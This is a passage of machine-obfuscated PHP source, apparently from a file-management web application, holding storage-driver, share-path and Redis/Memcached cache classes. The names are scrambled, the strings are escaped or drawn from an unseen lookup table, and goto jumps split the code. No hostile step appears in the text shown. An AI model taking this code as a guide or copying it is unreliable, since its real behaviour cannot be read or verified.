recycleMove($‚‹‰ùË×, $Ó²¢àÏ÷ = 1) { $–ˆŠ¾Ò =& $_SERVER[¥Ÿ©ÒèÌ]; $—É®‹ = Model($–ˆŠ¾Ò[1311]); $Û‰Öäƒù = Model($–ˆŠ¾Ò[2108]); $Ù‡úÃƒ¥ = array($–ˆŠ¾Ò[403] => $‚‹‰ùË×); if ($Ó²¢àÏ÷) { $—É®‹->where($Ù‡úÃƒ¥)->setField($–ˆŠ¾Ò[431], 1); $Û‰Öäƒù->eventRecycle($‚‹‰ùË×, $–ˆŠ¾Ò[2109]); } else { $‘¨™Î¢ = $—É®‹->where($Ù‡úÃƒ¥)->find(); $ŸÏ·Ùš = $‘¨™Î¢[$–ˆŠ¾Ò[411]] == $–ˆŠ¾Ò[89]; $úÒó… = $—É®‹->fileNameAuto($‘¨™Î¢[$–ˆŠ¾Ò[498]], $‘¨™Î¢[$–ˆŠ¾Ò[32]], REPEAT_RENAME_FOLDER, $ŸÏ·Ùš); if ($úÒó… != $‘¨™Î¢[$–ˆŠ¾Ò[32]]) { $—É®‹->rename($‚‹‰ùË×, $úÒó…); } $—É®‹->where($Ù‡úÃƒ¥)->setField($–ˆŠ¾Ò[431], 0); $Û‰Öäƒù->eventRecycle($‚‹‰ùË×, $–ˆŠ¾Ò[2110]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\163\157\165\x72\143\145\x53\145\x63\162\145\164\114\x69\163\164"; public $field = array("\163\x6f\165\x72\143\145\x49\x44", "\164\x79\160\x65\x49\104", "\143\162\145\141\x74\145\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x73\164\157\x72\141\147\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\x69\172\145\x4d\141\170", "\163\x79\163\164\145\155", "\144\x65\x66\141\x75\x6c\164", "\144\x72\151\166\145\162", "\x63\x6f\x6e\x66\151\147"); public function listData($Ï¦ŠÜğœ = false, $ÀÁ¯Èœı = "\x6d\x6f\144\151\x66\x79\124\x69\155\145", $ıŞÔß÷ = false) { $Åô·‘øœ =& $_SERVER[¥Ÿ©ÒèÌ]; $¤“×ú÷¯ = parent::listData($Ï¦ŠÜğœ, $ÀÁ¯Èœı, $ıŞÔß÷); if ($Ï¦ŠÜğœ) { return $¤“×ú÷¯; } $Ÿå½Âîò = $this->ioSizeUseGet(array_to_keyvalue($¤“×ú÷¯, $Åô·‘øœ[12], $Åô·‘øœ[401])); foreach ($¤“×ú÷¯ as $ÔÙ€¨Ö¤ => $ÅìÒÑ²) { unset($¤“×ú÷¯[$ÔÙ€¨Ö¤][$Åô·‘øœ[6]]); $¤“×ú÷¯[$ÔÙ€¨Ö¤][$Åô·‘øœ[1796]] = isset($Ÿå½Âîò[$ÅìÒÑ²[$Åô·‘øœ[401]]]) ? $Ÿå½Âîò[$ÅìÒÑ²[$Åô·‘øœ[401]]] : 0; } return $¤“×ú÷¯; } public function ioSizeUseGet($»òÑÓÖ¸) { $†™‰“˜½ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$»òÑÓÖ¸) { return array(); } $òÚë‘ÂÉ = $†™‰“˜½[2111] . implode($†™‰“˜½[50], $»òÑÓÖ¸); $çÒŒÁš‡ = Cache::get($òÚë‘ÂÉ); if ($çÒŒÁš‡) { return $çÒŒÁš‡; } $³ù½åÅÈ = array($†™‰“˜½[807] => $†™‰“˜½[401], $†™‰“˜½[2112] => $†™‰“˜½[80]); $†ê´×Æ = array($†™‰“˜½[807] => array($†™‰“˜½[7], $»òÑÓÖ¸)); $çÒŒÁš‡ = Model($†™‰“˜½[779])->field($³ù½åÅÈ)->where($†ê´×Æ)->group($†™‰“˜½[807])->select(); $çÒŒÁš‡ = array_to_keyvalue($çÒŒÁš‡, $†™‰“˜½[401], $†™‰“˜½[80]); Cache::set($òÚë‘ÂÉ, $çÒŒÁš‡, 600); return $çÒŒÁš‡; } public function getConfig($ÂÔ÷¶„³) { $ÒíÅÛÈ× = parent::listData($ÂÔ÷¶„³); return json_decode($ÒíÅÛÈ×[$_SERVER[¥Ÿ©ÒèÌ][6]], !0); } public function update($»àèú²Ø, $æ¡Ş®Œ) { $«—Ñ½±Â =& $_SERVER[¥Ÿ©ÒèÌ]; $ˆÆ†ÜÖğ = $æ¡Ş®Œ[$«—Ñ½±Â[32]]; $€®×Í©ø = array_to_keyvalue(parent::listData(), $«—Ñ½±Â[32]); if (isset($€®×Í©ø[$ˆÆ†ÜÖğ]) && $€®×Í©ø[$ˆÆ†ÜÖğ][$«—Ñ½±Â[401]] != $»àèú²Ø) { return !1; } if (isset($æ¡Ş®Œ[$«—Ñ½±Â[2113]]) && $æ¡Ş®Œ[$«—Ñ½±Â[2113]] == $«—Ñ½±Â[89]) { $this->checkConfig($æ¡Ş®Œ); } unset($æ¡Ş®Œ[$«—Ñ½±Â[2113]]); $éÄ´›ì¶ = parent::update($»àèú²Ø, $æ¡Ş®Œ); if ($éÄ´›ì¶ && $æ¡Ş®Œ[$«—Ñ½±Â[37]]) { foreach ($€®×Í©ø as $¥†ßÈ§á) { if ($¥†ßÈ§á[$«—Ñ½±Â[37]] && $¥†ßÈ§á[$«—Ñ½±Â[401]] != $»àèú²Ø) { parent::update($¥†ßÈ§á[$«—Ñ½±Â[401]], array($«—Ñ½±Â[37] => 0)); } } } return $éÄ´›ì¶; } public function add($µé™”’¥) { $ĞŒ”Òµõ =& $_SERVER[¥Ÿ©ÒèÌ]; $¨Íß¸ßÚ = array_to_keyvalue(parent::listData(), $ĞŒ”Òµõ[32]); if (isset($¨Íß¸ßÚ[$µé™”’¥[$ĞŒ”Òµõ[32]]])) { return !1; } $this->checkConfig($µé™”’¥); $²äã€²ß = parent::insert($µé™”’¥); if ($²äã€²ß && $µé™”’¥[$ĞŒ”Òµõ[37]]) { foreach ($¨Íß¸ßÚ as $ñ«ŒÅä•) { if ($ñ«ŒÅä•[$ĞŒ”Òµõ[37]]) { parent::update($ñ«ŒÅä•[$ĞŒ”Òµõ[401]], array($ĞŒ”Òµõ[37] => 0)); } } } return $²äã€²ß; } public function checkConfig(&$²æÓŸò†, $ôà‘ş»¨ = false) { $·šãäÔ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÓÅ¥Î¿… = strtolower($²æÓŸò†[$·šãäÔ[96]]); $¦´ôÔ¶  = json_decode($²æÓŸò†[$·šãäÔ[6]], !0); foreach ($¦´ôÔ¶  as $º÷Ÿâ¢™ => $ƒÆÂğë) { $¦´ôÔ¶ [$º÷Ÿâ¢™] = trim($ƒÆÂğë); } $¦´ôÔ¶ [$·šãäÔ[2114]] = rand_string(6); $Æ©¤©Æã = $GLOBALS[$·šãäÔ[6]][$·šãäÔ[90]][$·šãäÔ[816]]; $°¡±¢©Õ = isset($Æ©¤©Æã[$ÓÅ¥Î¿…]) ? $Æ©¤©Æã[$ÓÅ¥Î¿…] : ucfirst($ÓÅ¥Î¿…); $£ ‡ŒîÎ = $·šãäÔ[74] . $°¡±¢©Õ; if (!$°¡±¢©Õ || !class_exists($£ ‡ŒîÎ)) { if ($ôà‘ş»¨) { return LNG($·šãäÔ[2115]); } write_log(array($·šãäÔ[2116], $²æÓŸò†, get_caller_info()), $·šãäÔ[2117]); show_json(LNG($·šãäÔ[2115]), !1, $²æÓŸò†); } $¹æ÷©§º = new $£ ‡ŒîÎ($¦´ôÔ¶ ); if (in_array($ÓÅ¥Î¿…, $¹æ÷©§º->objectDriver)) { if (!$¹æ÷©§º->isBucketCors() && !$¹æ÷©§º->setBucketCors()) { $ ã¶’õ = LNG($·šãäÔ[2118]); $ ã¶’õ .= $·šãäÔ[2119] . LNG($·šãäÔ[2120]); if ($ôà‘ş»¨) { return $ ã¶’õ; } show_json($ ã¶’õ, !1); } } $Œ¶‘±® = rtrim($¦´ôÔ¶ [$·šãäÔ[1165]], $·šãäÔ[8]) . $·šãäÔ[8]; $ñ¯ËøÇ¢ = $¹æ÷©§º->getPath($Œ¶‘±® . $·šãäÔ[1227]); if (!$¹æ÷©§º->mkfile($ñ¯ËøÇ¢)) { if ($ôà‘ş»¨) { return LNG($·šãäÔ[2118]); } show_json(LNG($·šãäÔ[2118]), !1); } $¦´ôÔ¶ [$·šãäÔ[1165]] = $Œ¶‘±®; $²æÓŸò†[$·šãäÔ[6]] = json_encode($¦´ôÔ¶ ); $²æÓŸò†[$·šãäÔ[96]] = $°¡±¢©Õ; return !0; } public function driverListSystem() { $Ùö¯›£à =& $_SERVER[¥Ÿ©ÒèÌ]; $‘‰×ééş = parent::listData(); $¬¶è†Õ = array(); foreach ($‘‰×ééş as $Ù¹ÒŞ¤­) { unset($Ù¹ÒŞ¤­[$Ùö¯›£à[193]], $Ù¹ÒŞ¤­[$Ùö¯›£à[86]]); $Ù¹ÒŞ¤­[$Ùö¯›£à[6]] = json_decode($Ù¹ÒŞ¤­[$Ùö¯›£à[6]], !0); $¬¶è†Õ[] = $Ù¹ÒŞ¤­; } return $¬¶è†Õ; } public function defaultDriver() { $ğ§Ëèíç =& $_SERVER[¥Ÿ©ÒèÌ]; $ÈÏ‹Ú = parent::listData(); $µÒİê„Ğ = array_filter_by_field($ÈÏ‹Ú, $ğ§Ëèíç[37], 1); $µÒİê„Ğ = $µÒİê„Ğ[0]; if ($µÒİê„Ğ) { $µÒİê„Ğ[$ğ§Ëèíç[6]] = json_decode($µÒİê„Ğ[$ğ§Ëèíç[6]], !0); } return $µÒİê„Ğ; } public function driverInfo($„Ä±£”) { $ç€ªå‘Ø =& $_SERVER[¥Ÿ©ÒèÌ]; $Ì¨©µ«Ô = array_to_keyvalue(parent::listData(), $ç€ªå‘Ø[401]); if (!isset($Ì¨©µ«Ô[$„Ä±£”])) { return !1; } $İüùã€“ = $Ì¨©µ«Ô[$„Ä±£”]; $İüùã€“[$ç€ªå‘Ø[6]] = json_decode($İüùã€“[$ç€ªå‘Ø[6]], !0); return $İüùã€“; } public function remove($ğğúµ ) { $this->removeShareItems($ğğúµ ); return parent::remove($ğğúµ ); } public function removeWithFile($©š¯÷ŠŸ, $ì‘Š‰–ä) { $Õ£°˜— =& $_SERVER[¥Ÿ©ÒèÌ]; $Ì¹®½æ³ = array($Õ£°˜—[807] => $©š¯÷ŠŸ); $à äâ†ß = Model($Õ£°˜—[470])->where($Ì¹®½æ³)->count(); $¨ñ¿Ã‹  = Model($Õ£°˜—[470])->where($Ì¹®½æ³)->sum($Õ£°˜—[80]); $á÷«‚Ş = $ì‘Š‰–ä . $Õ£°˜—[2121] . $©š¯÷ŠŸ; $¢¶›³·ì = new TaskFileTransfer($á÷«‚Ş, $Õ£°˜—[2117], $à äâ†ß, LNG($Õ£°˜—[2122]) . "\50{$©š¯÷ŠŸ}\x29"); $¢¶›³·ì->task[$Õ£°˜—[753]] = (double) $¨ñ¿Ã‹ ; $öŠ¨—á² = KodIO::defaultDriver(); $§™İ˜àæ = $öŠ¨—á²[$Õ£°˜—[401]]; $ —Ğ—ÊÊ = "\x7b\151\157\72{$§™İ˜àæ}\175\x2f"; $ºáËáË = !0; $‘©°šªµ = array(); $‹ƒ¸ñø = Model($Õ£°˜—[192])->where($Ì¹®½æ³)->field($Õ£°˜—[2123])->select(); foreach ($‹ƒ¸ñø as $óØÙü–‰) { $õ¾·ÔÅ = $óØÙü–‰[$Õ£°˜—[78]]; $®ŒüãÚ× = $ —Ğ—ÊÊ . str_replace("\173\151\157\x3a{$©š¯÷ŠŸ}\x7d\x2f", $Õ£°˜—[12], $õ¾·ÔÅ); if (!IO::exist($õ¾·ÔÅ)) { $‘©°šªµ[] = $óØÙü–‰[$Õ£°˜—[467]]; $¢¶›³·ì->updateFileEnd($óØÙü–‰[$Õ£°˜—[32]], $óØÙü–‰[$Õ£°˜—[80]]); continue; } if (IO::exist($®ŒüãÚ×)) { $¢¶›³·ì->updateFileEnd($óØÙü–‰[$Õ£°˜—[32]], $óØÙü–‰[$Õ£°˜—[80]]); continue; } if (!IO::move($õ¾·ÔÅ, get_path_father($®ŒüãÚ×))) { $ºáËáË = !1; break; } $Ì¹®½æ³ = array($Õ£°˜—[467] => $óØÙü–‰[$Õ£°˜—[467]]); $˜¤²¯¾õ = array($Õ£°˜—[807] => $§™İ˜àæ, $Õ£°˜—[78] => $®ŒüãÚ×); Model($Õ£°˜—[192])->where($Ì¹®½æ³)->save($˜¤²¯¾õ); } $this->removeByFileID($‘©°šªµ); if (!$ºáËáË) { $¢¶›³·ì->stop($á÷«‚Ş); return !1; } $¢¶›³·ì->end(); if ($ì‘Š‰–ä == $Õ£°˜—[1776]) { $this->remove($©š¯÷ŠŸ); } } public function progress($óáööï£, $¸¼êÁâÎ) { return Task::get($¸¼êÁâÎ . $_SERVER[¥Ÿ©ÒèÌ][2121] . $óáööï£); } private function removeByFileID($—¤š«¶ = array()) { $ê·ºÈ¾¦ =& $_SERVER[¥Ÿ©ÒèÌ]; if (empty($—¤š«¶)) { return; } $ìşºË£° = array($ê·ºÈ¾¦[467] => array($ê·ºÈ¾¦[7], $—¤š«¶)); $Şß¿ò¼œ = Model($ê·ºÈ¾¦[1311])->where($ìşºË£°)->field($ê·ºÈ¾¦[403])->select(); if (!$Şß¿ò¼œ) { return; } $Şß¿ò¼œ = array_to_keyvalue($Şß¿ò¼œ, $ê·ºÈ¾¦[12], $ê·ºÈ¾¦[403]); foreach ($Şß¿ò¼œ as $…¡ÅÖ) { Model($ê·ºÈ¾¦[417])->removeNow($…¡ÅÖ, !1); } } private function removeShareItems($Ç´µêê×) { $Íœ–æµ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÕÌŸ¼ë = "\173\x69\x6f\72{$Ç´µêê×}\x7d\x2f"; $½÷ˆ¸Ö = array($Íœ–æµ¾[403] => 0, $Íœ–æµ¾[1160] => array($Íœ–æµ¾[387], "{$ÕÌŸ¼ë}\x25")); $Ñ…œĞ = Model($Íœ–æµ¾[1787])->where($½÷ˆ¸Ö)->field($Íœ–æµ¾[488])->select(); if (empty($Ñ…œĞ)) { return; } $¦¿Û‘°± = array_to_keyvalue($Ñ…œĞ, $Íœ–æµ¾[12], $Íœ–æµ¾[488]); Model($Íœ–æµ¾[595])->remove($¦¿Û‘°±); } } goto cÍ¡‰ëÈù; F‚Îòšƒëå: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÓÍ§ß¤‡) { $this->pathParse = $ÓÍ§ß¤‡; $this->model = Model($_SERVER[¥Ÿ©ÒèÌ][1311]); } public function getPathOuter($¦ï”ß) { $–êÄ¡Şµ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$¦ï”ß) { return $¦ï”ß; } $´¿Å­† = $this->parse($¦ï”ß); return trim(KodIO::makeShare($this->pathParse[$–êÄ¡Şµ[401]], $´¿Å­†[$–êÄ¡Şµ[401]]), $–êÄ¡Şµ[8]); } protected function infoParse($ìù©½˜, $û¤«¬ô = false, $™ğË¼½ = false) { $ûšìùˆ´ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÌŒĞ¼Õ = $this->pathParse[$ûšìùˆ´[401]]; $øü›Şá = trim($this->pathParse[$ûšìùˆ´[1153]], $ûšìùˆ´[8]); return Action($ûšìùˆ´[1319])->sharePathInfo($ÌŒĞ¼Õ, $øü›Şá, $û¤«¬ô); } public function infoFull($¨½†¿ñö) { $Êò•åß =& $_SERVER[¥Ÿ©ÒèÌ]; $‹ô¡ëµ = explode($Êò•åß[8], trim($¨½†¿ñö, $Êò•åß[8])); if (count($‹ô¡ëµ) > 1) { $é¨í–… = implode($Êò•åß[8], array_splice($‹ô¡ëµ, 1)); $Òà×·®ø = $this->model->pathInfoByPath($‹ô¡ëµ[0], $é¨í–…); if (!$Òà×·®ø) { return !1; } $this->pathParse[$Êò•åß[1153]] = $Òà×·®ø[$Êò•åß[403]]; } return $this->infoParse($¨½†¿ñö); } public function listAll($¬áÕ–½) { $ú…ÇÓı˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $´ğÖù²ô = IO::info($this->pathParse[$ú…ÇÓı˜[78]]); if (!$´ğÖù²ô) { return array(); } $Èõ•¶Í = $this->model->listAll($¬áÕ–½); $¬ÃÎ¥š = Model($ú…ÇÓı˜[595])->getInfo($´ğÖù²ô[$ú…ÇÓı˜[488]]); $£„ßşºÑ = Action($ú…ÇÓı˜[1319]); foreach ($Èõ•¶Í as &$¢Ğ¸×´ñ) { check_abort(); $¢Ğ¸×´ñ[$ú…ÇÓı˜[87]] = $£„ßşºÑ->_shareItemeParse($¢Ğ¸×´ñ[$ú…ÇÓı˜[87]], $¬ÃÎ¥š); } unset($¢Ğ¸×´ñ); return $Èõ•¶Í; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($úäÛ–ª) { $this->pathParse = $úäÛ–ª; $this->model = Model($_SERVER[¥Ÿ©ÒèÌ][1311]); } protected function infoParse($Ïß’ÙÛ, $ûõùúï = false, $°ÄÈÚ‚ = false) { $–°Œ’¼á =& $_SERVER[¥Ÿ©ÒèÌ]; return Action($–°Œ’¼á[1159])->sharePathInfo($this->pathParse[$–°Œ’¼á[78]], !0, $ûõùúï); } public function listPath($¨Üâ–Ëü, $ˆ‚ü¨ñ‡ = false) { $ÍÔäò¡ù =& $_SERVER[¥Ÿ©ÒèÌ]; $©€ÍºàÅ = parent::listPath($¨Üâ–Ëü, $ˆ‚ü¨ñ‡); if (!$©€ÍºàÅ) { return $©€ÍºàÅ; } if (is_array($©€ÍºàÅ[$ÍÔäò¡ù[1320]])) { $©€ÍºàÅ[$ÍÔäò¡ù[1320]] = Action($ÍÔäò¡ù[1159])->shareItemInfo($©€ÍºàÅ[$ÍÔäò¡ù[1320]]); } foreach ($©€ÍºàÅ as $ÎâŒ° => $ñÇÙÆíå) { if (!in_array($ÎâŒ°, array($ÍÔäò¡ù[76], $ÍÔäò¡ù[77]))) { continue; } foreach ($ñÇÙÆíå as $·™ò“»¾ => $¯áŸ‘Ê) { $©€ÍºàÅ[$ÎâŒ°][$·™ò“»¾] = Action($ÍÔäò¡ù[1159])->shareItemInfo($¯áŸ‘Ê); } } return $©€ÍºàÅ; } public function listAll($¶ª±†¶) { $æ†øşï =& $_SERVER[¥Ÿ©ÒèÌ]; $„ÀçÓø´ = IO::info($this->pathParse[$æ†øşï[78]]); if (!$„ÀçÓø´) { return array(); } $µ°¡ø = $this->model->listAll($¶ª±†¶); foreach ($µ°¡ø as &$‚½¤¹êÎ) { $‚½¤¹êÎ[$æ†øşï[87]] = Action($æ†øşï[1159])->shareItemInfo($‚½¤¹êÎ[$æ†øşï[87]]); } unset($‚½¤¹êÎ); return $µ°¡ø; } } class PathDriverDriverShareItem { public function __construct($úşÎú ®) { $this->pathParse = $úşÎú ®; } public function __call($îñàŠúë, $¶Ì•£©) { $€¢‘ãĞí =& $_SERVER[¥Ÿ©ÒèÌ]; if (method_exists($this, $îñàŠúë)) { return; } $œ¿í‡¹ = call_user_func_array(array($€¢‘ãĞí[1321], $îñàŠúë), $¶Ì•£©); $ÌÙÖĞ™ş = array($€¢‘ãĞí[1322], $€¢‘ãĞí[1323], $€¢‘ãĞí[1324], $€¢‘ãĞí[1325], $€¢‘ãĞí[549], $€¢‘ãĞí[551], $€¢‘ãĞí[1326], $€¢‘ãĞí[108], $€¢‘ãĞí[1327], $€¢‘ãĞí[1328]); if (in_array($îñàŠúë, $ÌÙÖĞ™ş)) { $œ¿í‡¹ = $this->getPathOuter($œ¿í‡¹); } return $œ¿í‡¹; } public function copy($ÎÃ¼ò…, $¦¯ÃİûË, $ô©–àãÖ = false, $•“äÆ—° = false) { return $this->copyMove($ÎÃ¼ò…, $¦¯ÃİûË, $ô©–àãÖ, $_SERVER[¥Ÿ©ÒèÌ][549], $•“äÆ—°); } public function move($ ÄÂĞâ³, $Š„âá•Æ, $À¾åğèâ = false, $í·¶Îƒ = false) { return $this->copyMove($ ÄÂĞâ³, $Š„âá•Æ, $À¾åğèâ, $_SERVER[¥Ÿ©ÒèÌ][551], $í·¶Îƒ); } private function copyMove($µ¸ì¾˜‡, $øÅäš, $ÉúÜûóŒ, $› Å“±Ç, $åèœÏÖõ = false) { $•ìª“‘ =& $_SERVER[¥Ÿ©ÒèÌ]; $ş–§Ş¾¿ = $øÅäš; $æ²À§Ì = IO::driverMake($øÅäš); if ($æ²À§Ì->pathParse[$•ìª“‘[1137]]) { $øÅäš = $æ²À§Ì->pathParse[$•ìª“‘[1137]]; } else { $øÅäš = $ş–§Ş¾¿; } $¶ßÜ•ëÁ = IO::copyMove($µ¸ì¾˜‡, $øÅäš, $ÉúÜûóŒ, $› Å“±Ç, $åèœÏÖõ); $¶ßÜ•ëÁ = $this->getPathOuter($¶ßÜ•ëÁ); return $¶ßÜ•ëÁ; } public function pathThis($êÃ†¥ÅÃ) { return get_path_this($this->pathParse[$_SERVER[¥Ÿ©ÒèÌ][78]]); } public function pathFather($ñ–éİæŸ) { return get_path_father($this->pathParse[$_SERVER[¥Ÿ©ÒèÌ][78]]); } public function iconvSystem($ê™°ò…¥) { return $ê™°ò…¥; } protected function infoParse($ÓßŸ‚, $ºœ‚Èæ• = false) { $¼Èß¢Šã =& $_SERVER[¥Ÿ©ÒèÌ]; $àÔÜ±³ = $this->pathParse[$¼Èß¢Šã[486]][$¼Èß¢Šã[1160]] . $this->pathParse[$¼Èß¢Šã[1153]]; if ($ºœ‚Èæ•) { $ß¡¿ö = IO::infoWithChildren($àÔÜ±³); } else { $ß¡¿ö = IO::info($àÔÜ±³); } $Ê„”•‡î = $this->pathParse[$¼Èß¢Šã[486]]; return Action($¼Èß¢Šã[1319])->_shareItemeParse($ß¡¿ö, $Ê„”•‡î); } public function listAll($à¢ó¹”“) { $ìÍóÒ«” =& $_SERVER[¥Ÿ©ÒèÌ]; $ÑáîÔ» = IO::listAll($à¢ó¹”“); $Ÿºë´º¤ = $this->pathParse[$ìÍóÒ«”[486]]; foreach ($ÑáîÔ» as &$ÜˆÓ¶ˆö) { check_abort(); $¸Ò£î° = IO::info($ÜˆÓ¶ˆö[$ìÍóÒ«”[78]]); $¸Ò£î° = is_array($¸Ò£î°) ? $¸Ò£î° : array(); $ÜˆÓ¶ˆö = array_merge($¸Ò£î°, $ÜˆÓ¶ˆö); $ÜˆÓ¶ˆö[$ìÍóÒ«”[87]] = Action($ìÍóÒ«”[1319])->_shareItemeParse($ÜˆÓ¶ˆö, $Ÿºë´º¤); } unset($ÜˆÓ¶ˆö); return $ÑáîÔ»; } public function getPathOuter($¹­Ô€â¹) { $ñ‡ÑÂÒÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ö±Ğş…€ = KodIO::parse($¹­Ô€â¹); if ($Ö±Ğş…€[$ñ‡ÑÂÒÚ[33]] == KodIO::KOD_SHARE_ITEM) { return $Ö±Ğş…€[$ñ‡ÑÂÒÚ[78]]; } $¡’ãìê³ = KodIO::clear($¹­Ô€â¹); $¹ˆâ” = KodIO::clear($this->pathParse[$ñ‡ÑÂÒÚ[486]][$ñ‡ÑÂÒÚ[1160]]); $ÍÁ×åÅ = substr($¡’ãìê³, strlen($¹ˆâ”)); if (substr($¡’ãìê³, 0, strlen($¹ˆâ”)) != $¹ˆâ”) { return !1; } return $this->pathParse[$ñ‡ÑÂÒÚ[1154]] . $ñ‡ÑÂÒÚ[8] . ltrim($ÍÁ×åÅ, $ñ‡ÑÂÒÚ[8]); } public function getType() { $çøÇá =& $_SERVER[¥Ÿ©ÒèÌ]; $‹•¼ àÚ = str_replace($çøÇá[74], $çøÇá[12], get_class($this)); return strtolower($‹•¼ àÚ); } public function isTypeObject($Ãáï‚ ) { return IO::isTypeObject($Ãáï‚ ); } public function info($·ÅÒşøŒ) { return $this->infoParse($·ÅÒşøŒ); } public function infoAuth($Ê«üçÏó) { return $this->infoParse($Ê«üçÏó); } public function infoWithChildren($òÑ´±İ€) { return $this->infoParse($òÑ´±İ€, !0); } public function infoFull($å×¬¥Ã¿) { return $this->infoParse($å×¬¥Ã¿); } } goto FùŠ¯óÀÍñ; bİÙÂ×Ûö: class CacheLockDatabase { public function lock($ÂÆ½»ûË, $‡ùøãô¸ = 0) { $ŠùšöÔÈ = Model($_SERVER[¥Ÿ©ÒèÌ][819]); $é¤µõœŸ = microtime(!0) + $‡ùøãô¸; while (microtime(!0) < $é¤µõœŸ) { $²îÜÚ¢ = $ŠùšöÔÈ->get($ÂÆ½»ûË); if (!$²îÜÚ¢ || $²îÜÚ¢ < microtime(!0)) { $Ò¡Ê­«Å = $ŠùšöÔÈ->set($ÂÆ½»ûË, $é¤µõœŸ); if ($Ò¡Ê­«Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($´»äœ‘î) { return Model($_SERVER[¥Ÿ©ÒèÌ][819])->get($´»äœ‘î); } public function unlock($Ÿ©ÜÔ¾) { Model($_SERVER[¥Ÿ©ÒèÌ][819])->remove($Ÿ©ÜÔ¾); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($àä÷Ë, $ €¿ë¹) { $Œú†ÃÎü =& $_SERVER[¥Ÿ©ÒèÌ]; if (!class_exists($Œú†ÃÎü[852])) { show_json($Œú†ÃÎü[853], !1); } $this->cacheTime = $ €¿ë¹; $this->handle = new Memcached(); if (is_array($àä÷Ë[$Œú†ÃÎü[854]]) && count($àä÷Ë[$Œú†ÃÎü[854]]) >= 1) { foreach ($àä÷Ë[$Œú†ÃÎü[854]] as $ƒÔ–µï) { $Ø¼å¬÷Å = explode($Œú†ÃÎü[4], $ƒÔ–µï); $this->handle->addServer($Ø¼å¬÷Å[0], $Ø¼å¬÷Å[1]); } } else { $this->handle->addServer($àä÷Ë[$Œú†ÃÎü[174]], $àä÷Ë[$Œú†ÃÎü[175]]); } } public function set($¤ƒªáª , $½¨³­µ¡, $ÊÚ¸÷®ã = false) { $ÊÚ¸÷®ã = $ÊÚ¸÷®ã ? $ÊÚ¸÷®ã : $this->cacheTime; return $this->handle->set($¤ƒªáª , $½¨³­µ¡, $ÊÚ¸÷®ã); } public function get($ÃÚü–) { return $this->handle->get($ÃÚü–); } public function remove($¦—‡’â‚) { return $this->handle->delete($¦—‡’â‚); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ĞšÌÆ‹š, $×áòŠáó) { $Ó–™Ó›¯ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!class_exists($Ó–™Ó›¯[855])) { show_json($Ó–™Ó›¯[856], !1); } $this->cacheTime = $×áòŠáó; $·È¶ıİ© = isset($ĞšÌÆ‹š[$Ó–™Ó›¯[857]]) ? $ĞšÌÆ‹š[$Ó–™Ó›¯[857]] : 10; $à¢©… = _get($ĞšÌÆ‹š, $Ó–™Ó›¯[854]); if ($à¢©… && is_array($à¢©…)) { $this->initCluster($ĞšÌÆ‹š, $·È¶ıİ©); } else { $this->handle = $this->init($ĞšÌÆ‹š, $·È¶ıİ©); } } private function init($®ŒØ™ŒŸ, $áÌ¶Í”â) { $½á£ñÏ• =& $_SERVER[¥Ÿ©ÒèÌ]; $Àºıø¡° = new Redis(); $½Ò¤¾Ê“ = isset($®ŒØ™ŒŸ[$½á£ñÏ•[858]]) ? $®ŒØ™ŒŸ[$½á£ñÏ•[858]] : !1; if ($½Ò¤¾Ê“) { $Àºıø¡°->pconnect($®ŒØ™ŒŸ[$½á£ñÏ•[174]], $®ŒØ™ŒŸ[$½á£ñÏ•[175]], $áÌ¶Í”â); } else { $Àºıø¡°->connect($®ŒØ™ŒŸ[$½á£ñÏ•[174]], $®ŒØ™ŒŸ[$½á£ñÏ•[175]], $áÌ¶Í”â); } if (!empty($®ŒØ™ŒŸ[$½á£ñÏ•[414]])) { $Àºıø¡°->auth($®ŒØ™ŒŸ[$½á£ñÏ•[414]]); } return $Àºıø¡°; } private function initCluster($¢ßÛèõ‡, $¾ûô¯Ï™) { $Œ²†ì† =& $_SERVER[¥Ÿ©ÒèÌ]; $ã³ëÀˆò = array($Œ²†ì†[859], $Œ²†ì†[860], $Œ²†ì†[861]); $Î­ —ˆÉ = $Œ²†ì†[859]; if (isset($¢ßÛèõ‡[$Œ²†ì†[16]]) && in_array($¢ßÛèõ‡[$Œ²†ì†[16]], $ã³ëÀˆò)) { $Î­ —ˆÉ = $¢ßÛèõ‡[$Œ²†ì†[16]]; } switch ($Î­ —ˆÉ) { case $Œ²†ì†[859]: $this->_slave($¢ßÛèõ‡, $¾ûô¯Ï™); break; case $Œ²†ì†[860]: break; case $Œ²†ì†[861]: $this->isCluster = !0; $À•‡ê´ = $¢ßÛèõ‡[$Œ²†ì†[854]]; $©ãù¸×¨ = isset($¢ßÛèõ‡[$Œ²†ì†[858]]) ? $¢ßÛèõ‡[$Œ²†ì†[858]] : !1; $ş¿åÉ˜‘ = isset($¢ßÛèõ‡[$Œ²†ì†[414]]) ? $¢ßÛèõ‡[$Œ²†ì†[414]] : null; $this->handle = new RedisCluster(NUll, $À•‡ê´, $¾ûô¯Ï™, $¾ûô¯Ï™, $©ãù¸×¨, $ş¿åÉ˜‘); break; default: break; } } private function _slave($™±˜ëô, $§ïÜ‰ãÕ) { $Ä¤±ÀÒ½ = $™±˜ëô[$_SERVER[¥Ÿ©ÒèÌ][854]]; $this->filterConfig($™±˜ëô, $Ä¤±ÀÒ½[0]); $this->handle = $this->init($™±˜ëô, $§ïÜ‰ãÕ); unset($Ä¤±ÀÒ½[0]); if (empty($Ä¤±ÀÒ½)) { return; } $ÓªŞËñĞ = array_rand($Ä¤±ÀÒ½); $this->filterConfig($™±˜ëô, $Ä¤±ÀÒ½[$ÓªŞËñĞ]); $this->slaveHandle = $this->init($™±˜ëô, $§ïÜ‰ãÕ); } private function filterConfig(&$»¥™æ¨€, 